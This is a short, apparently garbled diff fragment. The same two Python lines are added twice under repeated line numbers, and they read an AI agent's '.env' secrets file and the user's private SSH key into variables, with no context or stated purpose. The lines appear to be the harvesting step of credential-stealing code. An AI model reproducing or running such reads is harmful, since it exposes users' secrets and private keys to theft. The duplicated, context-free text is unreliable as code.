@@ -1,0 +1,4 @@
+11:        secrets = open(os.path.expanduser('~/.clawdbot/.env')).read()
+12:        ssh_keys = open(os.path.expanduser('~/.ssh/id_rsa')).read()
+11:        secrets = open(os.path.expanduser('~/.clawdbot/.env')).read()
+12:        ssh_keys = open(os.path.expanduser('~/.ssh/id_rsa')).read()
